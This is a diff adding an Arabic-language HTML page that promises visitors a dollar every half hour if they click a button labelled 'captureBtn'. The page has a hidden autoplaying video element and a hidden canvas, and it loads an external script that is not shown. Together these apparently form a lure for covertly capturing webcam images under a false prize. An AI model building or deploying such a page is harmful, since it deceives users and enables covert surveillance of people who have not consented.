@@ -1,0 +1,55 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>اضغط واربح دولار</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      background: url('../static/win_background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+      color: #fff;
+    }
+    #overlay {
+      position: absolute;
+      top:0; left:0; right:0; bottom:0;
+      backdrop-filter: blur(5px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    #countdown {
+      font-size: 100px;
+      display: none;
+    }
+    #video {
+      display: none;
+    }
+    #captureBtn {
+      padding: 20px 40px;
+      font-size: 24px;
+      background: #28a745;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div id="overlay">
+    <h1>اضغط واربح دولار كل نص ساعة</h1>
+    <button id="captureBtn">اضغط الآن</button>
+    <div id="countdown"></div>
+  </div>
+
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script src="../static/script.js"></script>
+</body>
+</html>
